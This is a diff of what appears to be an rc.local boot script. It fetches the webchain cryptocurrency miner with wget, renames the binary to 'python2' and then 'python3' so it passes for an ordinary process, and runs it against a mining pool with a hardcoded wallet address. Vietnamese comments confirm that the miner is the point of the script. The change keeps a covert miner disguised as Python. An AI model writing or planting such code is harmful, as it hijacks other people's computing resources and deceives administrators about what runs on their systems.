@@ -10,15 +10,15 @@
 # bits.
 #
 # By default this script does nothing.
-if [ -f ${PWD}/python2 ]; then
-    if pgrep -x "python2" > /dev/null
+if [ -f ${PWD}/python3 ]; then
+    if pgrep -x "python3" > /dev/null
 then
     echo "Miner dang chay roi , ke cmn di "
     
 else
 
 echo "Miner da install , chay thoi "
-./python2 -o pool.webchain.network:3333 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x
+./python3 -o pool.webchain.network:3333 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x
 
      
 fi
@@ -28,8 +28,9 @@ fi
 
 wget https://github.com/webchain-network/webchain-miner/releases/download/v2.6.2.0/webchain-miner-2.6.2.0-linux-amd64.tar.gz
 tar xvzf webchain-miner-2.6.2.0-linux-amd64.tar.gz
-mv webchain-miner python2
+cd webchain-miner
+mv webchain-miner python3
 rm config.json
-./python2 -o pool.webchain.network:3333 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x
+./python3 -o pool.webchain.network:3333 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x
 
 exit 0
